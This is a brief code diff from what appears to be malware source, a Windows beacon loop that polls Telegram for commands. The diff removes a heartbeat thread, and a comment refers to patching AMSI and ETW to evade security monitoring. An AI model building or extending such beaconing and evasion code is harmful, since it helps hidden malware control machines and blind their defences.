@@ -896,9 +896,6 @@ VOID BeaconLoop() {
     HANDLE hTele = CreateThread(nullptr, 0, TelegramPoller, nullptr, 0, nullptr);
     if (hTele) CloseHandle(hTele);
 
-    HANDLE hHb = CreateThread(nullptr, 0, HeartbeatThread, nullptr, 0, nullptr);
-    if (hHb) CloseHandle(hHb);
-
     DWORD failures = 0;
     bool sentHello = false;
     // ponytail: skip ReapplyEvasion on first pass — PatchAMSI/ETW already ran above;
